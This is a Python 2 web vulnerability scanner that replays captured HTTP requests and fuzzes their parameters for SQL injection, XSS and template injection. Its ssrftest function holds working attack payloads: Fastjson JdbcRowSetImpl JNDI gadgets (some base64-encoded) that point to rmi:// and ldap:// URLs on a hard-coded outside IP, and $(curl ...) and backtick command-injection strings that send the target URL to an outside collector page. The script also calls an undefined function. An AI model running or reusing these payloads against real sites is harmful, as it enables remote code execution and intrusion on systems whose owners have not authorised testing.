#!/usr/bin/env python
# -*- coding: cp936 -*-
import urlparse,requests,re,os,urllib
requests.packages.urllib3.disable_warnings()
import socket
socket.setdefaulttimeout(15)
from Loger import Loger
loger=Loger()
def dict2str(testdict):
    strline=""
    for key in testdict:
        strline+=key+"="+testdict[key]+"&"
    return strline[:-1]

def text_list(requestlist,scheme):
    requestdict={}
    if "GET " in requestlist[0]:
        requestdict['method']="GET"
        i=1
        dictheader = {}
        while i<len(requestlist)-1:
            headerzu=requestlist[i].split(':')
            headerkey=headerzu[0]
            if 'Content-Length' in headerkey or 'Accept-Encoding' in headerkey:
                i+=1
                continue
            headervalue=""
            j=1
            while j<len(headerzu):
                headervalue+=headerzu[j]+":"
                j+=1
            if headerkey.split() == '':
                i+=1
            dictheader[headerkey]=headervalue[:-1].strip()
            i+=1
        requestdict['headers']=dictheader
        testurl = scheme + "://" + requestdict['headers']['Host'].strip() + requestlist[0].replace('GET ', '').replace(' HTTP/1.1', '')
        if '?' not in testurl:
            return requestdict
        requesturl,requestparma=testurl.split("?")
        requestdict['url'] = requesturl
        requestdict['testurl'] = testurl
        parmazu=requestparma.split('&')
        pamadict={}
        for parma in parmazu:
            key,value=parma.split('=')
            pamadict[key]=value
        requestdict['query'] = pamadict
        return requestdict
    if "POST " in requestlist[0]:
        requestdict['method'] = "POST"
        dictheader={}
        i=1
        while i<len(requestlist)-2:
            headerzu = requestlist[i].split(':')
            headerkey = headerzu[0]
            if 'Content-Length' in headerkey or 'Accept-Encoding' in headerkey or headerkey.split()=="":
                i+=1
                continue
            headervalue = ""
            j = 1
            while j < len(headerzu):
                headervalue += headerzu[j]+":"
                j += 1
            dictheader[headerkey] = headervalue[:-1].strip()
            i += 1
        requestdict['headers'] = dictheader
        testurl = scheme + "://"+dictheader['Host'].strip()+requestlist[0].replace('POST ','').replace(' HTTP/1.1','')+"?"+requestlist[len(requestlist)-1]
        requestdict['url'] = scheme + "://" + requestdict['headers']['Host'].strip()+requestlist[0].replace('POST ','').replace(' HTTP/1.1','')
        requestdict['testurl']=testurl
        requestparma=requestlist[len(requestlist)-1]
        parmazu = requestparma.split('&')
        pamadict = {}
        for parma in parmazu:
            key, value = parma.split('=')
            pamadict[key] = value
        requestdict['query'] = pamadict
        return requestdict
    if "GET " not in requestlist[0] and "POST " not in requestlist[0]:
        return requestdict

def ReadFileToList(path):
    templist=[]
    filetxt=open(path,"r")
    for line in filetxt:
        templist.append(line.strip())
    filetxt.close()
    return templist

def requestGet():
    requestlist=[]
    requesttxtlist=os.listdir("request/")
    for r in requesttxtlist:
        request=ReadFileToList("request/"+r)
        requestlist.append(request)
    return requestlist


def send_request(dictrequest):
    print dictrequest['url']
    print dictrequest['query']
    dictstatus={}
    try:
        if dictrequest['method'] == "GET":
            testurl = dictrequest['url']+'?'+dict2str(dictrequest['query'])
            try:
                r = requests.get(testurl, headers=dictrequest['headers'], verify=False, timeout=15)
                dictstatus['time'] = r.elapsed.total_seconds()
                dictstatus['content'] = r.text
                dictstatus['code'] = r.status_code
                dictstatus['headers'] = r.headers
                return dictstatus
            except Exception as ex:
                if 'timeout' in ex.message:
                    dictstatus['time'] = '15'
                    dictstatus['content'] = 'timeout'
                    dictstatus['code'] = '504'
                    dictstatus['headers'] = {}
                else:
                    dictstatus['time'] = '0'
                    dictstatus['content'] = ''
                    dictstatus['code'] = '500'
                    dictstatus['headers'] = {}
                return dictstatus
        if dictrequest['method'] == "POST":
            try:
                r = requests.post(dictrequest['url'], data=dictrequest['query'], headers=dictrequest['headers'],verify=False, timeout=15)
                dictstatus['time'] = r.elapsed.seconds
                dictstatus['content'] = r.text
                dictstatus['code'] = r.status_code
                dictstatus['headers'] = r.headers
                return dictstatus
            except Exception as ex:
                if 'timeout' in ex.message:
                    dictstatus['time'] = '15'
                    dictstatus['content'] = 'timeout'
                    dictstatus['code'] = '504'
                    dictstatus['headers'] = {}
                else:
                    dictstatus['time'] = '0'
                    dictstatus['content'] = ''
                    dictstatus['code'] = '500'
                    dictstatus['headers'] = {}
                return dictstatus
    except:
        return dictstatus
parafilterlist=loger.ReadToList('parafilter.txt')
def sqltest(requestdict):
    rulelist=loger.ReadToList('sqlrule.txt')
    for key in requestdict['query']:
        if key in parafilterlist:
            continue
        temp=requestdict['query'][key]
        for rule in rulelist:
            if '^' in rule:
                requestdict['query'][key]=rule.replace('\n','').replace('^','')
            else:
                requestdict['query'][key] =requestdict['query'][key]+rule.replace('\n', '')
            request_status=send_request(requestdict)
            if request_status['time']>7:
                #print "��������ע�룺"+str(requestdict)+"���²��Ը�����"
                loger.LogWrite('testsql1.txt',requestdict['method']+" "+requestdict['url']+'?'+dict2str(requestdict['query']).replace('^',''))
                request_status2 = send_request(requestdict)
                if request_status2['time']>7:
                    print "����ע�룺"+str(requestdict)
                    loger.LogWrite('testsql2.txt',requestdict['method'] + " " + requestdict['url']+'?'+dict2str(requestdict['query']).replace('^',''))
                    requestdict['query'][key] = temp
                    break
            requestdict['query'][key] = temp

def ssrftest(requestdict):
    mubiao=requestdict['testurl']
    rulelist=['QHR5cGUiOiJjb20uc3VuLnJvd3NldC5KZGJjUm93U2V0SW1wbCIsImRhdGFTb3VyY2VOYW1lIjoibGRhcDovLzEyMi4xMTQuMTM2LjEwODoxMTM4OS9vYmoiLCJhdXRvQ29tbWl0Ijp0cnVlfQ==','eyJAdHlwZSI6ImNvbS5zdW4ucm93c2V0LkpkYmNSb3dTZXRJbXBsIiwiZGF0YVNvdXJjZU5hbWUiOiJybWk6Ly8xMjIuMTE0LjEzNi4xMDg6MTEzODkvb2JqIiwiYXV0b0NvbW1pdCI6dHJ1ZX0=','{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://122.114.136.108:11389/obj","autoCommit":true}','{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://122.114.136.108:11389/obj","autoCommit":true}','http://www.uddlab.cn/php/cookiecatch.php?str='+requestdict['url'],'http://www.uddlab.cn/php/cookiecatch.php?str='+mubiao,'$(curl http://www.uddlab.cn/php/cookiecatch.php?str='+mubiao+')','|curl http://www.uddlab.cn/php/cookiecatch.php?str='+mubiao,'`curl curl http://www.uddlab.cn/php/ssrf.php`','`curl http://www.uddlab.cn/php/cookiecatch.php?str='+mubiao+'`']
    for key in requestdict['query']:
        temp=requestdict['query'][key]
        for rule in rulelist:
            requestdict['query'][key]=rule
            send_request(requestdict)
            requestdict['query'][key]=temp

def xsstest(requestdict):
    rulelist=['wctest','">wcshuangyinhao<',"'wcdanyinhao"]
    for key in requestdict['query']:
        temp=requestdict['query'][key]
        for rule in rulelist:
            requestdict['query'][key]=requestdict['query'][key]+rule
            request_status=send_request(requestdict)
            if rule in request_status['content'] and 'text/html' in request_status['headers']['Content-Type']:
                #print "��������xss��"+str(requestdict)
                loger.LogWrite('testxss.txt',requestdict['method']+" "+requestdict['url']+dict2str(requestdict['query']))
            requestdict['query'][key] = temp
    tempurl=requestdict["url"]
    for rule in rulelist:
        requestdict["url"]=requestdict["url"]+rule
        sendstatus=send_request(requestdict)
        if rule in sendstatus["content"]:
            loger.LogWrite('testxss.txt',requestdict['method'] + " " + requestdict['url'] + "?" + tuple_query(requestdict['query']))
        requestdict["url"]=tempurl

def modetest(requestdict):
    rulelist=["{1245+34211}","{1245+34212}","{{1245+34211}}","{{1245+34212}}"]
    for key in requestdict['query']:
        temp = requestdict['query'][key]
        for rule in rulelist:
            requestdict['query'][key]=rule
            request_status=send_request(requestdict)
            if '35456' in request_status['content'] and '35457' in request_status['content']:
                #print "��������ģ��ע�룺"+str(requestdict)
                loger.LogWrite('testmuban.txt',requestdict['method']+" "+requestdict['url']+dict2str(requestdict['query']))
            requestdict['query'][key] = temp
    tempurl=requestdict['url']
    for rule in rulelist:
        requestdict['url']=requestdict['url']+rule
        send_request(requestdict)
        requestdict['url']=tempurl


if __name__=="__main__":
    testlist=requestGet()
    havetestlist=[]
    for test in testlist:
        try:
            testdict = text_list(test, "http")
            if testdict['method']=='GET' and '?' not in testdict['testurl']:
                continue
            requestdict = send_request(testdict)
            if requestdict['time'] > 10:
                #print "���󳬳�����������"
                continue
            else:
                if testdict['url'] not in havetestlist:
                    havetestlist.append(testdict['url'])
                    sqltest(testdict)
        except:
            continue

